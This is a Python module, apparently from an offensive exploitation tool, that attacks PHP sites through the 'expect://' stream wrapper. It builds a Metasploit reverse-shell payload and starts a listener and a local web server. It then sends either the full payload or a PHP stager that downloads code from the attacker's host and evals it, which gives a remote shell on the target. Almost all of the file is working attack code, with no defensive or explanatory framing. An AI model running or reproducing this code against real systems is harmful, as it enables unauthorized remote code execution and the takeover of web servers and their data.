import subprocess
from os.path import abspath, dirname, join
from urllib.parse import quote

from .utils import listener, attack, colors, cook, msf_payload

from .Detection import Detection

STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
HERE = abspath(dirname(__file__))


class Expect:
    def __init__(self, args):
        self.target = args.url
        self.nostager = args.nostager
        self.cookies = args.cookies
        self.detection = args.detection

    def attack(self, payload):
        payload = f"expect://{payload}"
        if self.cookies:
            cookies = cook(self.cookies)
            response = attack(self.target, payload, cookies=cookies)
        else:
            response = attack(self.target, payload)
        return response

    def execute_expect(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        lhost, lport, shell = msf_payload()
        file = join(HERE, "Server.py")
        handle = listener(lhost, lport)
        handle.handler()

        if self.nostager:
            print(colors("[~] No-Staged Selected!", 93))
            with open("/tmp/{0}.php".format(shell), "r") as f:
                payload = 'expect://echo "'
                payload += quote(f.read().replace('"', '\\"').replace("$", "\\$"))
                payload += '" | php'
        else:
            payload = 'expect://echo "' + STAGER.format(lhost, shell) + '" | php'
            print(colors("[~] Starting Web Server ... ", 93))

            try:
                p = subprocess.Popen(
                    ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
                )
                p.communicate()
            except OSError as os_error:
                print(colors("[!] Process Error", 91))
                print(os_error)
        input(
            colors(
                "[?] Press Enter To Continue When Your netcat listener is Running ...",
                94,
            )
        )

        if self.cookies:
            cookies = cook(self.cookies)
            attack(self.target, payload, cookies=cookies)
        else:
            attack(self.target, payload)
